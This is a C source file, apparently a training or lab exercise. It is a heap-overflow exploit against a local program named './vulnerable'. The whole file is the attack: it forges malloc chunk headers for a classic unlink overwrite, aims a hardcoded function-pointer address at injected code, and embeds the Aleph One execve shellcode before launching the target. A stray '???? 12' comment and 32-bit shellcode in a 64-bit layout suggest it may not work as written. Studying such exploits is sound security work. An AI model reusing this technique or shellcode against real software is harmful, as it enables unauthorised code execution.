#include <string.h>
#include <stdio.h>
#include <unistd.h>

#define INT_SIZE 8

#define FUNCTION_POINTER ( 0x0000000000601018 )
#define CODE_ADDRESS ( 0x1bf7010 + 2*INT_SIZE )

#define VULNERABLE "./vulnerable"
#define DUMMY 0xdeadbeafAAAAAAAA
#define PREV_INUSE 0x1


char shellcode[] =
        /* the jump instruction */
        "\xeb\x0appssssffff"
        /* the Aleph One shellcode */
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/ls";

int main() {
        char * p;
        char argv1[ 704 + 1 ];
        char * argv[] = { VULNERABLE, argv1, NULL };

        p = argv1;
        /* the fd field of the first chunk */
        *( (void **)p ) = (void *)( DUMMY );
        p += INT_SIZE;
        /* the bk field of the first chunk */
        *( (void **)p ) = (void *)( DUMMY );
        p += INT_SIZE;
        /* the special shellcode */
        memcpy( p, shellcode, strlen(shellcode) );
        p += strlen( shellcode );
        /* the padding */
        int padding_size = (704 - 4*INT_SIZE) - (2*INT_SIZE + strlen(shellcode));
        memset( p, 'B',  padding_size);
        p += padding_size;
        /* the prev_size field of the second chunk */
        *( (size_t *)p ) = (size_t)( DUMMY & ~PREV_INUSE );
        p += INT_SIZE;
        /* the size field of the second chunk */
        *( (size_t *)p ) = (size_t)( 1000 );
        p += INT_SIZE;
        /* the fd field of the second chunk */
        *( (void **)p ) = (void *)( FUNCTION_POINTER - 24 ); /*???? 12*/
        p += INT_SIZE;
        /* the bk field of the second chunk */
        *( (void **)p ) = (void *)( CODE_ADDRESS );
        p += INT_SIZE;
        /* the terminating NUL character */
        *p = '\0';

        /* the execution of the vulnerable program */
        puts("start");
        execve(argv[0], argv, NULL);
        puts("end");
        return( -1 );
}
